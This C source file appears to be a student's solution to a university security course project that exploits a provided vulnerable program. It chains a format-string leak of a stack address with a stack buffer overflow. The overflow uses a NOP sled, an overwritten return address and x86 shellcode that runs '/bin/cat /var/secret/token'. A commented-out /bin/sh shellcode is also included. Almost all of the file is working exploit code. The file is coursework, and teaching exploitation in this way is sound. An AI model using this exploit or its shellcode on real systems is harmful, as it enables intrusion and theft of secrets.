/*
 * CSCI 368, Spring 2025
 * Project 1 | task1
 *
 * Build instructions:
 *   For grading, this will be built with the Makefile provided; you may not make
 *   any changes to the Makefile.  You can #include any other standard C
 *   libraries you want in this file, but none that require any compiler
 *   flags that aren't already in the Makefile.
 *
 */

#include <unistd.h>
#include <stdio.h>  // for fwrite()
#include <string.h> // for memset()
#include <stdlib.h> // for EXIT_SUCCESS
#include <stdint.h> // useful

#include "comms.h"  // for communicating with vulnerable

// Note the bigger buffer this time
#define BUFFER_SIZE 512

/* We are providing you with shell code */

// The following shellcode would launch a shell. 
// Play with it! But it's not what we are using in this project
/*
char shellcode[]=
    "\x31\xc0"             // xorl    %eax,%eax
    "\x50"                 // pushl   %eax
    "\x68""//sh"           // pushl   $0x68732f2f
    "\x68""/bin"           // pushl   $0x6e69622f
    "\x89\xe3"             // movl    %esp,%ebx
    "\x50"                 // pushl   %eax
    "\x53"                 // pushl   %ebx
    "\x89\xe1"             // movl    %esp,%ecx
    "\x99"                 // cdql
    "\xb0\x0b"             // movb    $0x0b,%al
    "\xcd\x80"             // int     $0x80
    ;
*/

// Instead, we will be using this "shellcode"; rather than actually open a
// shell, it executes the command '/bin/cat /var/secret/token'

char shellcode[] =
    "\x31\xc0"         // xor    %eax, %eax
    "\x99"             // cltd
    "\x52"             // push   %edx
    "\x68""/cat"       // push   $0x7461632f
    "\x68""/bin"       // push   $0x6e69622f
    "\x89\xe3"         // mov    %esp, %ebx
    "\x52"             // push   %edx
    "\x68""oken"       // push   oken (reversed)
    "\x68""///t"       // push   ///t (reversed) 
    "\x68""ret/"       // push   ret/ (reversed)
    "\x68""/sec"       // push   /sec (reversed)
    "\x68""/var"       // push   /var (reversed)
    "\x89\xe1"         // mov    %esp, %ecx
    "\xb0\x0b"         // mov    $0xb, %al
    "\x52"             // push   %edx
    "\x51"             // push   %ecx
    "\x53"             // push   %ebx
    "\x89\xe1"         // mov    %esp, %ecx
    "\xcd\x80"         // int    $0x80
    ;


int main()
{

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);  // Initialized to all zeroes

    /* TODO: You may change this string */

    // NOTE: First %p is the memory address of sender
    // From there, we can calculate the offset to input_buffer
    // We can then set the return address to the start of input_buffer
    // and execute our shell code that way.
    char greeting[128] = "%16p%16p%16p%16p%16p%16p%16p%lu";

    /* Send our greeting to the vulnerable program and get the response */
    char response[512];
    ssize_t resplen;
    resplen = sendto_and_recvfrom_vulnerable(
		    greeting, sizeof(greeting)-1,   /* sent to vulnerable */
		    response, sizeof(response));    /* received from vulnerable */

    // Calculating the offset to the input buffer
    printf("Response: %s\n", response);
    uint32_t buffer_loc = atoll(response+(16*7)) - 144;
    printf("Buffer location: %lu (%p)\n", buffer_loc, buffer_loc);

    // NOTE: shellcode has a size of 54 
    // the return address should have an offset of 64+12 = 76
    // from the start of input_buffer

    // Injecting nops to overflow the buffer
    memset(buffer, '\x90', 76);

    // Setting the return address to the 100th index of our buffer
    *(uint32_t*)(buffer+76) = buffer_loc+100;

    // Creating a nop slide in case we're off slightly
    memset(buffer+80, '\x90', 20);

    // Injecting the shell code
    memcpy(buffer+100, shellcode, 54);

    /* Finally, send the buffer (expect no response) */
    sendto_vulnerable(buffer, sizeof(buffer));

    return EXIT_SUCCESS;
}
